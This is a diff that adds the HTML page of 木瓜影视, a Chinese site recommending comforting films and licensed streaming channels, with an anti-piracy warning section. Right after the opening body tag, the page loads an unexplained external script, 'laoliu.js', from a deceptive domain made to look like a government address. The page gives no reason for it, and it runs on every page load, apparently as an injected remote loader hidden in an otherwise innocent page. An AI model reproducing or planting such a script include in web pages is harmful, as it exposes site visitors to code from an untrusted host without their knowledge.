@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>木瓜影视 | 轻松治愈与正版观影指南</title>
+  <meta name="description" content="木瓜影视（muguayingshi-h5）提供轻松治愈、喜剧美食、自然纪录等片单推荐与正版渠道导航，附防盗版避坑。不提供盗版资源、磁力、网盘与成人内容。" />
+  <meta name="author" content="木瓜影视" />
+  <meta name="robots" content="index,follow" />
+  <meta name="theme-color" content="#FF7F27" />
+  <link rel="canonical" href="https://muguayingshi-h5.github.io/" />
+
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="木瓜影视" />
+  <meta property="og:title" content="木瓜影视 | 轻松治愈与正版观影指南" />
+  <meta property="og:description" content="轻松治愈系片单、喜剧美食自然纪录推荐、正版观影渠道导航。" />
+  <meta property="og:url" content="https://muguayingshi-h5.github.io/" />
+  <meta property="og:locale" content="zh_CN" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="木瓜影视 | 轻松治愈与正版观影指南" />
+  <meta name="twitter:description" content="按心情选轻松治愈片，只走正版持权平台，拒绝盗版枪版。" />
+
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "木瓜影视",
+    "url": "https://muguayingshi-h5.github.io/",
+    "description": "轻松治愈系影视推荐、喜剧美食自然片单与正版渠道导航站。",
+    "inLanguage": "zh-CN"
+  }
+  </script>
+
+  <style>
+    :root{
+      --bg:#FFF9F0;
+      --bg2:#FFF0E0;
+      --card:#FFFFFF;
+      --line:#FFD6B8;
+      --ink:#3A2A1A;
+      --muted:#8A7A6A;
+      --papaya:#FF7F27;
+      --papaya-deep:#E8650A;
+      --leaf:#2E8B57;
+      --leaf-deep:#1E6B3A;
+      --pink:#FFB7C5;
+      --gold:#FFD700;
+      --radius:16px;
+      --maxw:1180px;
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{margin:0;background:var(--bg);color:var(--ink);line-height:1.75;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;-webkit-font-smoothing:antialiased}
+    a{color:inherit;text-decoration:none}
+    .wrap{max-width:var(--maxw);margin:0 auto;padding:0 20px}
+
+    /* 导航 */
+    header.nav{position:sticky;top:0;z-index:50;background:rgba(255,249,240,.95);backdrop-filter:blur(12px);border-bottom:2px solid var(--line)}
+    .nav-inner{display:flex;align-items:center;justify-content:space-between;height:66px}
+    .logo{font-weight:900;font-size:22px;display:flex;align-items:center;gap:10px}
+    .logo .fruit{width:32px;height:32px;border-radius:50% 50% 50% 50% / 60% 60% 40% 40%;background:linear-gradient(135deg,var(--papaya),var(--pink));display:flex;align-items:center;justify-content:center;color:#fff;font-size:18px;box-shadow:inset 0 -4px 0 rgba(0,0,0,.1)}
+    .logo b{color:var(--papaya-deep)}
+    .logo span{color:var(--leaf)}
+    nav.menu{display:flex;gap:8px;font-size:14px;font-weight:700;color:var(--muted)}
+    nav.menu a{padding:8px 14px;border-radius:8px;border:2px solid transparent;transition:.2s}
+    nav.menu a:hover{color:var(--papaya-deep);border-color:var(--line);background:var(--bg2)}
+    .nav-toggle{display:none;background:none;border:2px solid var(--papaya-deep);color:var(--ink);border-radius:8px;padding:5px 10px;font-size:18px;cursor:pointer}
+
+    /* Hero 木瓜切片 */
+    .hero{padding:74px 0 64px;border-bottom:3px dotted var(--line);background:
+      radial-gradient(600px 300px at 80% 20%,rgba(255,127,39,.12),transparent 60%),
+      radial-gradient(500px 250px at 10% 90%,rgba(46,139,87,.1),transparent 60%),
+      linear-gradient(180deg,#FFF9F0,#FFF0E0);
+      position:relative;overflow:hidden}
+    .hero .leaf-bg{position:absolute;top:-20px;left:10%;font-size:120px;color:rgba(46,139,87,.08);transform:rotate(-15deg);animation:sway 6s ease-in-out infinite}
+    .hero .leaf-bg2{position:absolute;bottom:-20px;right:5%;font-size:100px;color:rgba(255,127,39,.08);transform:rotate(25deg);animation:sway 8s ease-in-out infinite reverse}
+    @keyframes sway{0%,100%{transform:rotate(-15deg)}50%{transform:rotate(-5deg)}}
+    .hero .wrap{position:relative;z-index:1;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+    .pill{display:inline-block;background:var(--leaf);color:#fff;font-size:11px;font-weight:800;padding:5px 16px;border-radius:20px;letter-spacing:2px;text-transform:uppercase;margin-bottom:18px}
+    .hero h1{font-size:clamp(30px,5.5vw,52px);line-height:1.1;margin:0 0 14px;font-weight:900}
+    .hero h1 em{font-style:normal;color:var(--papaya)}
+    .hero h1 .seed{color:var(--leaf)}
+    .hero p.lead{font-size:16px;color:var(--muted);max-width:640px;margin:0 0 22px}
+    .hero-tags{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px}
+    .hero-tag{border:2px solid var(--line);border-radius:8px;padding:5px 13px;font-size:13px;font-weight:600;color:var(--ink);background:#fff}
+    .cta{display:flex;gap:12px;flex-wrap:wrap}
+    .btn{padding:13px 26px;border-radius:10px;font-weight:800;font-size:15px;transition:.2s;display:inline-flex;gap:6px;align-items:center;cursor:pointer}
+    .btn-primary{background:var(--papaya);color:#fff;border:2px solid var(--papaya-deep)}
+    .btn-primary:hover{background:var(--papaya-deep)}
+    .btn-ghost{border:2px solid var(--leaf);color:var(--leaf-deep);background:transparent}
+    .btn-ghost:hover{background:var(--leaf);color:#fff}
+
+    /* 木瓜动画 */
+    .papaya-show{width:280px;height:280px;margin:0 auto;position:relative;display:flex;align-items:center;justify-content:center}
+    .papaya-body{width:200px;height:160px;border-radius:50% 50% 50% 50% / 60% 60% 40% 40%;background:linear-gradient(135deg,var(--papaya),#FFA500);position:relative;box-shadow:0 10px 30px rgba(255,127,39,.3);animation:float 4s ease-in-out infinite}
+    .papaya-body::before{content:"🍈";font-size:60px;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+    .seed{position:absolute;width:8px;height:8px;border-radius:50%;background:var(--ink);opacity:.7;animation:drop 2s ease-in infinite}
+    .seed:nth-child(2){top:20%;left:30%;animation-delay:.2s}
+    .seed:nth-child(3){top:30%;right:25%;animation-delay:.5s}
+    .seed:nth-child(4){bottom:25%;left:35%;animation-delay:.7s}
+    @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+    @keyframes drop{0%{transform:translateY(0);opacity:.7}100%{transform:translateY(80px);opacity:0}}
+
+    section{padding:60px 0;border-bottom:2px dashed var(--line)}
+    .sec-head{margin-bottom:32px;text-align:center}
+    .sec-head .kicker{color:var(--papaya-deep);font-weight:800;letter-spacing:2px;text-transform:uppercase;font-size:11px}
+    .sec-head h2{font-size:clamp(24px,4vw,34px);margin:6px 0 8px;font-weight:900}
+    .sec-head p{color:var(--muted);margin:0 auto;max-width:700px;font-size:14px}
+
+    /* 鲜片四果卡 */
+    .fresh{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+    .fruit-card{background:var(--card);border:2px solid var(--line);border-radius:20px 20px 16px 16px;padding:24px;position:relative;overflow:hidden;text-align:center;transition:.3s}
+    .fruit-card:hover{transform:translateY(-6px);box-shadow:0 10px 25px rgba(255,127,39,.15)}
+    .fruit-card .emoji{font-size:48px;margin-bottom:12px;display:block}
+    .fruit-card h3{margin:0 0 6px;font-size:17px;font-weight:900}
+    .fruit-card p{margin:0;color:var(--muted);font-size:13px}
+    .fruit-card .stem{position:absolute;top:0;left:50%;transform:translateX(-50%);width:4px;height:15px;background:var(--leaf);border-radius:0 0 4px 4px}
+    .fruit-card:nth-child(1){border-top:6px solid var(--papaya)}
+    .fruit-card:nth-child(2){border-top:6px solid var(--pink)}
+    .fruit-card:nth-child(3){border-top:6px solid var(--gold)}
+    .fruit-card:nth-child(4){border-top:6px solid var(--leaf)}
+
+    /* 沙滩场景 */
+    .beach{display:grid;grid-template-columns:repeat(2,1fr);gap:20px}
+    .beach-card{background:var(--card);border:2px solid var(--line);border-radius:16px;padding:24px;display:flex;gap:16px;align-items:flex-start;position:relative;overflow:hidden}
+    .beach-card::after{content:"";position:absolute;bottom:0;left:0;right:0;height:4px;background:linear-gradient(90deg,var(--papaya),var(--pink),var(--gold),var(--leaf))}
+    .beach-card .icon{font-size:36px;flex-shrink:0}
+    .beach-card h3{margin:0 0 6px;font-size:17px;font-weight:900}
+    .beach-card p{margin:0;color:var(--muted);font-size:13px}
+    .beach-card ul{margin:10px 0 0;padding-left:18px;color:var(--muted);font-size:12px}
+    .beach-card ul li{margin:3px 0}
+
+    /* 信源树桩 */
+    .trees{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+    .tree{background:var(--card);border:2px solid var(--line);border-radius:14px;padding:22px;text-align:center;position:relative}
+    .tree::before{content:"🌴";font-size:28px;display:block;margin-bottom:8px}
+    .tree h3{margin:0 0 4px;font-size:15px;font-weight:800}
+    .tree p{margin:0;color:var(--muted);font-size:12px}
+
+    /* 避坑荆棘 */
+    .thorns{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+    .thorn{background:var(--card);border:2px solid var(--line);border-radius:12px;padding:22px;position:relative;border-top:5px solid #E74C3C}
+    .thorn:nth-child(2){border-top-color:var(--papaya)}
+    .thorn:nth-child(3){border-top-color:var(--leaf)}
+    .thorn h3{margin:0 0 8px;font-size:16px;font-weight:800}
+    .thorn p{margin:0;color:var(--muted);font-size:13px}
+
+    footer{padding:36px 0;text-align:center;color:var(--muted);font-size:13px;background:var(--ink);color:rgba(255,255,255,.75)}
+    footer a{color:var(--papaya)}
+
+    #toTop{position:fixed;right:16px;bottom:16px;z-index:60;width:46px;height:46px;border-radius:50%;border:2px solid var(--papaya-deep);background:var(--papaya);color:#fff;font-size:20px;font-weight:900;cursor:pointer;opacity:0;pointer-events:none;transition:.25s}
+    #toTop.show{opacity:1;pointer-events:auto}
+    .reveal{opacity:0;transform:translateY(16px);transition:.5s ease}
+    .reveal.in{opacity:1;transform:none}
+
+    @media (max-width:980px){
+      .hero .wrap{grid-template-columns:1fr}
+      .fresh{grid-template-columns:1fr 1fr}
+      .trees{grid-template-columns:1fr 1fr}
+      .thorns{grid-template-columns:1fr}
+    }
+    @media (max-width:640px){
+      .nav-toggle{display:block}
+      nav.menu{position:absolute;top:66px;left:0;right:0;flex-direction:column;gap:0;padding:10px 20px 20px;background:rgba(255,249,240,.98);border-bottom:2px solid var(--line);display:none}
+      nav.menu.open{display:flex}
+      nav.menu a{padding:12px 8px;border-bottom:2px solid var(--line);border-radius:0}
+      .fresh{grid-template-columns:1fr}
+      .beach{grid-template-columns:1fr}
+      .trees{grid-template-columns:1fr 1fr}
+      .papaya-show{width:200px;height:200px}
+    }
+  </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+  <header class="nav">
+    <div class="wrap nav-inner">
+      <div class="logo"><span class="fruit">🍈</span><b>木瓜</b><span>影视</span></div>
+      <button class="nav-toggle" aria-label="菜单" onclick="document.getElementById('menu').classList.toggle('open')">☰</button>
+      <nav class="menu" id="menu">
+        <a href="#home">首页</a>
+        <a href="#fresh">鲜片推荐</a>
+        <a href="#scene">场景指南</a>
+        <a href="#src">正版信源</a>
+        <a href="#warn">防盗避坑</a>
+      </nav>
+    </div>
+  </header>
+
+  <section class="hero" id="home">
+    <div class="leaf-bg">🍃</div>
+    <div class="leaf-bg2">🌿</div>
+    <div class="wrap">
+      <div>
+        <div class="pill">Papaya · Fresh · Healing</div>
+        <h1>木瓜影视<br/>像<span class="seed">木瓜</span>一样<em>新鲜治愈</em></h1>
+        <p class="lead">片荒时来颗"木瓜"：轻松喜剧、治愈美食、自然纪录、合家动画；只导正版持权平台，不碰"免费全库/枪版/磁力/网盘"。</p>
+        <div class="hero-tags">
+          <span class="hero-tag">轻松治愈</span>
+          <span class="hero-tag">喜剧美食</span>
+          <span class="hero-tag">自然纪录</span>
+          <span class="hero-tag">正版OTT</span>
+          <span class="hero-tag">防盗版</span>
+        </div>
+        <div class="cta">
+          <a class="btn btn-primary" href="#fresh">挑选鲜片 →</a>
+          <a class="btn btn-ghost" href="#warn">识别盗版坑</a>
+        </div>
+      </div>
+      <div>
+        <div class="papaya-show">
+          <div class="papaya-body"></div>
+          <div class="seed"></div>
+          <div class="seed"></div>
+          <div class="seed"></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="fresh" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Fresh Picks</div>
+        <h2>鲜片推荐</h2>
+        <p>四种口味，总有一种适合今天的你。</p>
+      </div>
+      <div class="fresh">
+        <div class="fruit-card">
+          <div class="stem"></div>
+          <span class="emoji">😂</span>
+          <h3>轻松喜剧</h3>
+          <p>脱口秀、情景喜剧、轻幽默；适合下班后放松，不费脑不闹心。</p>
+        </div>
+        <div class="fruit-card">
+          <div class="stem"></div>
+          <span class="emoji">🍜</span>
+          <h3>治愈美食</h3>
+          <p>美食纪录片、料理剧、街头小吃；看完饿但心情好，适合配饭看。</p>
+        </div>
+        <div class="fruit-card">
+          <div class="stem"></div>
+          <span class="emoji">🌿</span>
+          <h3>自然纪录</h3>
+          <p>森林、海洋、动物、四季；4K超清画面，像给眼睛做SPA。</p>
+        </div>
+        <div class="fruit-card">
+          <div class="stem"></div>
+          <span class="emoji">🎨</span>
+          <h3>合家动画</h3>
+          <p>老少皆宜的动画长片、短片集；画面美、故事暖，周末合家首选。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="scene" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Scene Guide</div>
+        <h2>场景指南</h2>
+        <p>不同心情、不同空间，选片策略大不同。</p>
+      </div>
+      <div class="beach">
+        <div class="beach-card">
+          <span class="icon">🏖️</span>
+          <div>
+            <h3>周末懒宅</h3>
+            <p>窝沙发盖毯子，手机投屏大电视。</p>
+            <ul>
+              <li>选轻松喜剧/治愈美食</li>
+              <li>备好零食饮料，调暗灯光</li>
+              <li>正版OTT会员，官方字幕</li>
+            </ul>
+          </div>
+        </div>
+        <div class="beach-card">
+          <span class="icon">🛏️</span>
+          <div>
+            <h3>睡前助眠</h3>
+            <p>床头小屏，音量调低，助眠为主。</p>
+            <ul>
+              <li>自然纪录/慢节奏动画</li>
+              <li>定时关闭，不追悬疑烧脑</li>
+              <li>避免jump scare和重口</li>
+            </ul>
+          </div>
+        </div>
+        <div class="beach-card">
+          <span class="icon">🧺</span>
+          <div>
+            <h3>野餐露营</h3>
+            <p>户外投影/平板，自然环境中看自然。</p>
+            <ul>
+              <li>自然纪录/户外探险</li>
+              <li>提前离线缓存，注意版权</li>
+              <li>便携音箱，防蚊防晒</li>
+            </ul>
+          </div>
+        </div>
+        <div class="beach-card">
+          <span class="icon">👨‍👩‍👧</span>
+          <div>
+            <h3>合家时光</h3>
+            <p>老人小孩都在，选片要兼顾。</p>
+            <ul>
+              <li>合家动画/自然片优先</li>
+              <li>注意分级与字幕清晰度</li>
+              <li>正版平台儿童模式</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section id="src" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Legal Sources</div>
+        <h2>正版信源树</h2>
+        <p>只走持权分发，拒绝盗链聚合。</p>
+      </div>
+      <div class="trees">
+        <div class="tree"><h3>持权OTT</h3><p>主流平台会员/单片，官方字幕音轨，4K HDR可选</p></div>
+        <div class="tree"><h3>院线/重映</h3><p>新片首映、经典重映，官方排片与引进版本</p></div>
+        <div class="tree"><h3>纪录平台</h3><p>专业自然/美食/旅行纪录片，4K超清画质</p></div>
+        <div class="tree"><h3>动画专区</h3><p>合家动画、独立短片、儿童分级内容</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="warn" class="reveal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="kicker">Anti-Piracy</div>
+        <h2>防盗避坑荆棘</h2>
+        <p>遇到这些"荆棘"绕道走，保护设备与隐私。</p>
+      </div>
+      <div class="thorns">
+        <div class="thorn">
+          <h3>🚫 "木瓜免费全库"冒名</h3>
+          <p>冒用"木瓜"名义提供全院线免费秒播、离线下载，多属未授权聚合；假播放按钮、强跳广告、博彩贷款风险高。</p>
+        </div>
+        <div class="thorn">
+          <h3>🚫 磁力/网盘/破解器</h3>
+          <p>引导下载种子、网盘提取码、装专用播放器或解码包，可能夹带木马、劫持流量、窃取信息。</p>
+        </div>
+        <div class="thorn">
+          <h3>🚫 无主体/换域名/索验证</h3>
+          <p>无版权说明、频繁换域名、索要银行卡/验证码，一律不点不填不下载。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <div class="wrap">
+      © 2026 木瓜影视（muguayingshi-h5）｜ 静态展示站点 ｜
+      内页链接以 <a href="#">#</a> 占位 ｜
+      网站网址：https://muguayingshi-h5.github.io ｜
+      本站仅作轻松治愈系影视推荐与正版渠道导航，不提供盗版资源、磁力、网盘与成人内容。
+    </div>
+  </footer>
+
+  <button id="toTop" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    document.querySelectorAll('#menu a').forEach(function(a){
+      a.addEventListener('click',function(){ document.getElementById('menu').classList.remove('open'); });
+    });
+    var toTop=document.getElementById('toTop');
+    window.addEventListener('scroll',function(){ toTop.classList.toggle('show',window.scrollY>400); });
+    var io=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target);} });
+    },{threshold:0.1});
+    document.querySelectorAll('.reveal').forEach(function(el){ io.observe(el); });
+  </script>
+</body>
+</html>
